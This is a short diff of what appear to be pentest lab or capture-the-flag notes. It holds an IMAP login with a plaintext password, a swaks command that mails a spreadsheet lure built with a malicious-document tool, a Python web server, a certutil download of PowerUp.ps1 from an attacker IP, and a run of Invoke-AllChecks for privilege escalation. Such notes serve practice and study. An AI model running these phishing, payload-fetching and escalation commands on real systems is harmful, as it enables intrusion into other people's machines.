@@ -9,19 +9,19 @@ A1 LOGIN jonas SicMundusCreatusEst
 ```
 
 ```
-sudo swaks -t mailadmin@localhost --from jonas@localhost --attach @file.ods --server 192.168.124.140 --body "My message to you" --header "Subject: Please check this spreadsheet"
+cd ~/Desktop/Tools/MMG-LO && sudo swaks -t mailadmin@localhost --from jonas@localhost --attach @file.ods --server 192.168.124.140 --body "My message to you" --header "Subject: Please check this spreadsheet"
 ```
 
 ```
-
+cd ~/Desktop/Tools/Windows && python -m http.server 80
 ```
 
 ```
-
+certutil -urlcache -split -f http://192.168.45.161:80/PowerUp.ps1 -OutFile PowerUp.ps1
 ```
 
 ```
-
+PowerUp.ps1; Invoke-AllChecks
 ```
 
 ```
